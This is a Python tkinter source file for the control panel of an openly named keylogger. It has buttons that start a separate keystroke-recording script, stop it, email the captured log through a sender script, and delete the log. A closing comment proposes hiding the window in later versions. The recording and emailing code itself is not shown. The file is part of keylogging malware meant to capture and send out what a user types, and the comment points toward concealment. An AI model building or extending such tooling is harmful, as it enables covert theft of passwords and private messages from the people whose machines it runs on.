import tkinter as tk
import time
import os
import subprocess
from tkinter.font import Font
import keyboard

status="OFF"
# Create the main window
root = tk.Tk()
root.title("Keylogger")
root.geometry("250x110+100+50")
root.resizable(False, False)
#Set window color
root['background']='#ffd97d'

# Function for when the user presses the start button
def turn_Keylogger_on():
    # Update the Label to show that Keylogger is turned on
    status_label.config(bg="#a5ffd6" ,font=allfont , text="STATUS: ON")
    status="ON"
    global process
    #call the actual code to activate the keylogger main.py
    process = subprocess.Popen(['python', 'Keylogger\main.py'])


# Function to turn off the keylogger
def turn_Keylogger_off():
    # Update the Label to show that Keylogger is turned off
    status_label.config(bg="#ee6055", text="STATUS: OFF", font=allfont)
    status_label.place()
    global process
    #Kill the main.py function which was recording the log
    os.kill(process.pid, 9)
    #Emails the data after the button is pressed
    send_data()
    status="OFF"
#Function for sending the log file to an email
def send_data():
    send_process = subprocess.Popen(['python', 'Keylogger\sender.py'])
#Function that will delete the log once the button is pressed
def delete_log():
    os.remove("Keylogger/logs/log.txt")
#Set the font and size for the fonts of buttons
allfont=Font(family="Gotham", size=10, weight="bold")
#Start recording button
turn_on_button = tk.Button(root, bg="#a5ffd6", text="Start Logging", font=allfont, command=turn_Keylogger_on)
#Stop recording button
turn_off_button = tk.Button(root, bg='#ee6055',  text="Stop Logging",font=allfont, command=turn_Keylogger_off)
#Send data button
send_data_button= tk.Button(root, bg='#ff9914',  text="Force Upload",font=allfont, command=send_data)
#Delete button
del_button=tk.Button(root, bg='#ff9914',  text="  Delete Log  ",font=allfont, command=delete_log)

#Label that will show the status of the program
status_label = tk.Button(bg="#ee6055", text="STATUS: OFF", font=allfont)
# Pack the buttons and the Label into the main window
turn_on_button.pack(side=tk.TOP, anchor=tk.NW, pady=5, padx=5)
turn_off_button.pack(side=tk.TOP, anchor=tk.NW, pady=5, padx=5)

del_button.pack(pady=5, padx=5)
del_button.place(x=130, y=5)

send_data_button.pack(side=tk.TOP, anchor=tk.SE)
send_data_button.place(x=130, y= 40)

status_label.pack(side=tk.TOP, anchor=tk.N, pady=5, padx=5)



# Run the main loop
root.mainloop()


#For future updates...
        #To hide the default root window you can use

        #root.withdraw()
        #and to make it visible again you can use

        #root.deiconify()
